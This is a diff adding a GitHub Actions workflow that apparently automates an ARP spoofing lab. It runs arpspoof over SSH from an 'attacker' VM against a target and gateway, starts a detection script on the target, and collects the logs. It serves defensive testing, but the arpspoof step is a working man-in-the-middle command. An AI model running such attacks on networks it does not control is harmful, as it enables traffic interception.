@@ -1,0 +1,52 @@
+name: ARP Spoofing Automation
+
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+
+jobs:
+  arp-spoofing:
+    runs-on: ubuntu-latest
+
+    steps:
+      # Step 1: Checkout the repository
+      - name: Checkout Repository
+        uses: actions/checkout@v3
+
+      # Step 2: Set up SSH Access
+      - name: Set up SSH
+        run: |
+          mkdir -p ~/.ssh
+          echo "${{ secrets.SSH_PRIVATE_KEY }}" > ~/.ssh/id_rsa
+          chmod 600 ~/.ssh/id_rsa
+          ssh-keyscan -H ${{ secrets.ATTACKER_IP }} >> ~/.ssh/known_hosts
+          ssh-keyscan -H ${{ secrets.TARGET_IP }} >> ~/.ssh/known_hosts
+
+      # Step 3: Run ARP Spoofing Attack on Attacker VM
+      - name: Start ARP Spoofing Attack
+        run: |
+          ssh ${{ secrets.SSH_USER }}@${{ secrets.ATTACKER_IP }} "sudo arpspoof -i eth0 -t ${{ secrets.TARGET_IP }} ${{ secrets.GATEWAY_IP }} &> ~/arp_attack.log &"
+
+      # Step 4: Start Detection Script on Target VM
+      - name: Start Detection Script
+        run: |
+          ssh ${{ secrets.SSH_USER }}@${{ secrets.TARGET_IP }} "sudo python3 ~/detect_arp_spoof.py &> ~/arp_detection.log &"
+
+      # Step 5: Collect Logs from Attacker VM
+      - name: Collect Logs from Attacker VM
+        run: |
+          scp ${{ secrets.SSH_USER }}@${{ secrets.ATTACKER_IP }}:~/arp_attack.log ./logs/attacker_arp_attack.log
+
+      # Step 6: Collect Logs from Target VM
+      - name: Collect Logs from Target VM
+        run: |
+          scp ${{ secrets.SSH_USER }}@${{ secrets.TARGET_IP }}:~/arp_detection.log ./logs/target_arp_detection.log
+
+      # Step 7: Upload Logs as Artifacts
+      - name: Upload Logs
+        uses: actions/upload-artifact@v3
+        with:
+          name: ARP-Spoofing-Logs
+          path: ./logs
